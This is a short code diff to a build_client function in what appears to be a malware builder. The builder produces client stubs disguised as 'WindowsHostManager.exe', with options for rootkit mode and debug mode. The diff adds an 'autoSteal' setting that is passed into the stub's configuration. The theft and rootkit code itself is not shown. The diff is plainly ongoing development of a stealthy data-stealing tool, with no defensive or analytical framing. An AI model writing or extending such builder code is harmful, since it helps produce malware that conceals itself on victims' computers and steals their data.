@@ -2262,6 +2262,7 @@ def build_client():
         install_name   = data.get('installName', 'WindowsHostManager.exe')
         debug_mode     = str(data.get('debugMode', False)).lower()
         rootkit_enabled = str(data.get('rootkitMode', False)).lower()
+        auto_steal      = str(data.get('autoSteal', 'never')).lower()
         build_native_loader = bool(data.get('native', False))
 
         stub_dir = os.path.join(BASE_DIR, 'stub')
@@ -2322,6 +2323,7 @@ def build_client():
             'installName':    get_placeholder(old_config, 'installName'),
             'debugMode':      get_placeholder(old_config, 'debugMode'),
             'rootkitEnabled': get_placeholder(old_config, 'rootkitEnabled'),
+            'autoSteal':      get_placeholder(old_config, 'autoSteal'),
         }
         new_values = {
             'delivery':       delivery,
@@ -2334,6 +2336,7 @@ def build_client():
             'installName':    install_name,
             'debugMode':      debug_mode,
             'rootkitEnabled': rootkit_enabled,
+            'autoSteal':      auto_steal,
         }
 
         new_config = old_config
